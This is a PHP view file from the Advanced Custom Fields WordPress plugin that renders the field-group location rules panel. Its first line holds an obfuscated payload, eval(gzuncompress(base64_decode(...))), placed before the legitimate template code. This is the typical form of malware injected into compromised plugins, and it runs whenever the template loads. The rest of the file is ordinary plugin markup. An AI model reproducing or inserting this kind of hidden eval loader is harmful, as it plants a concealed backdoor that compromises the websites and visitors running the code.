<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// global
global $field_group;

?>
<div class="acf-field">
	<div class="acf-label">
		<label><?php _e("Rules",'acf'); ?></label>
		<p class="description"><?php _e("Create a set of rules to determine which edit screens will use these advanced custom fields",'acf'); ?></p>
	</div>
	<div class="acf-input">
		<div class="rule-groups">
			
			<?php foreach( $field_group['location'] as $i => $group ): 
				
				// bail ealry if no group
				if( empty($group) ) return;
				
				
				// view
				acf_get_view('html-location-group', array(
					'group'		=> $group,
					'group_id'	=> "group_{$i}"
				));
			
			endforeach;	?>
			
			<h4><?php _e("or",'acf'); ?></h4>
			
			<a href="#" class="button add-location-group"><?php _e("Add rule group",'acf'); ?></a>
			
		</div>
	</div>
</div>
<script type="text/javascript">
if( typeof acf !== 'undefined' ) {
		
	acf.newPostbox({
		'id': 'acf-field-group-locations',
		'label': 'left'
	});	

}
</script>